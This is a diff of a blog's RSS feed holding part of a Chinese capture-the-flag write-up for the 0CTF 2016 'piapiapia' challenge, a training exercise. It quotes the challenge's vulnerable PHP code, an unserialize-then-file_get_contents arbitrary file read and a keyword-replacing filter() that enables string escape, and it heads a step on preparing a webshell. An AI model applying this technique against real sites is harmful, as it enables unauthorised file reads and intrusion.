-      <pubDate>Fri, 30 May 2025 15:00:00 +0800</pubDate>
-      <guid>https://Samantha09.github.io/san-blog/posts/piapiapia/</guid>
-      <description>&lt;h2 id=&#34;题目信息&#34;&gt;题目信息&lt;/h2&gt;
+&lt;h2 id="利用步骤"&gt;利用步骤&lt;/h2&gt;
+&lt;h3 id="1-准备-webshell"&gt;1. 准备 webshell&lt;/h3&gt;
+&lt;p&gt;编写一个最简单的 PHP webshell：&lt;/p&gt;</description></item><item><title>[0CTF 2016]piapiapia</title><link>https://Samantha09.github.io/san-blog/posts/0ctf-2016piapiapia/</link><pubDate>Fri, 30 May 2025 15:00:00 +0800</pubDate><guid>https://Samantha09.github.io/san-blog/posts/0ctf-2016piapiapia/</guid><description>&lt;h2 id="题目信息"&gt;题目信息&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;strong&gt;类型&lt;/strong&gt;：Web / PHP 反序列化&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;核心漏洞&lt;/strong&gt;：反序列化字符串逃逸 + 任意文件读取&lt;/li&gt;
 &lt;li&gt;&lt;strong&gt;源码泄露&lt;/strong&gt;：&lt;code&gt;www.zip&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;源码结构&#34;&gt;源码结构&lt;/h2&gt;
+&lt;h2 id="源码结构"&gt;源码结构&lt;/h2&gt;
 &lt;p&gt;下载源码后得到以下关键文件：&lt;/p&gt;
 &lt;table&gt;
 	&lt;thead&gt;
@@ -377,26 +386,23 @@
 	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;hr&gt;
-&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析&lt;/h2&gt;
-&lt;h3 id=&#34;1-任意文件读取核心利用点&#34;&gt;1. 任意文件读取（核心利用点）&lt;/h3&gt;
+&lt;h2 id="漏洞分析"&gt;漏洞分析&lt;/h2&gt;
+&lt;h3 id="1-任意文件读取核心利用点"&gt;1. 任意文件读取（核心利用点）&lt;/h3&gt;
 &lt;p&gt;&lt;code&gt;profile.php&lt;/code&gt; 第 16 行：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$profile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($profile);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$photo &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;base64_encode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($profile[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;photo&amp;#39;&lt;/span&gt;]));
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;$profile&lt;/code&gt; 是从数据库读取的序列化字符串，经过 &lt;code&gt;unserialize()&lt;/code&gt; 后得到数组。&lt;code&gt;$profile[&#39;photo&#39;]&lt;/code&gt; 作为文件路径传入 &lt;code&gt;file_get_contents()&lt;/code&gt;，结果被 base64 编码输出到页面。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;如果能控制 &lt;code&gt;$profile[&#39;photo&#39;]&lt;/code&gt; 的值，就能读取服务器上的任意文件。&lt;/strong&gt;&lt;/p&gt;
-&lt;h3 id=&#34;2-反序列化字符串逃逸&#34;&gt;2. 反序列化字符串逃逸&lt;/h3&gt;
-&lt;h4 id=&#34;21-filter-函数&#34;&gt;2.1 filter() 函数&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$profile &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($profile);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$photo &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;base64_encode&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($profile[&lt;span style="color:#e6db74"&gt;&amp;#39;photo&amp;#39;&lt;/span&gt;]));
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;$profile&lt;/code&gt; 是从数据库读取的序列化字符串，经过 &lt;code&gt;unserialize()&lt;/code&gt; 后得到数组。&lt;code&gt;$profile['photo']&lt;/code&gt; 作为文件路径传入 &lt;code&gt;file_get_contents()&lt;/code&gt;，结果被 base64 编码输出到页面。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;如果能控制 &lt;code&gt;$profile['photo']&lt;/code&gt; 的值，就能读取服务器上的任意文件。&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id="2-反序列化字符串逃逸"&gt;2. 反序列化字符串逃逸&lt;/h3&gt;
+&lt;h4 id="21-filter-函数"&gt;2.1 filter() 函数&lt;/h4&gt;
 &lt;p&gt;&lt;code&gt;class.php&lt;/code&gt; 中的 &lt;code&gt;filter()&lt;/code&gt;：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;filter&lt;/span&gt;($string) {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $escape &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\\\\&amp;#39;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $escape &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;implode&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $escape) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $string &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;preg_replace&lt;/span&gt;($escape, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;, $string);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $safe &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;select&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;insert&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;update&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;where&amp;#39;&lt;/span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $safe &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;implode&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $safe) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/i&amp;#39;&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;preg_replace&lt;/span&gt;($safe, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hacker&amp;#39;&lt;/span&gt;, $string);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;关键点：&lt;/p&gt;</description>
-    </item>
-  </channel>
-</rss>
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;filter&lt;/span&gt;($string) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $escape &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\\\\&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $escape &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;implode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $escape) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $string &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_replace&lt;/span&gt;($escape, &lt;span style="color:#e6db74"&gt;&amp;#39;_&amp;#39;&lt;/span&gt;, $string);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $safe &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;select&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;insert&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;update&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;where&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $safe &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;implode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $safe) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/i&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_replace&lt;/span&gt;($safe, &lt;span style="color:#e6db74"&gt;&amp;#39;hacker&amp;#39;&lt;/span&gt;, $string);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;关键点：&lt;/p&gt;</description></item></channel></rss>
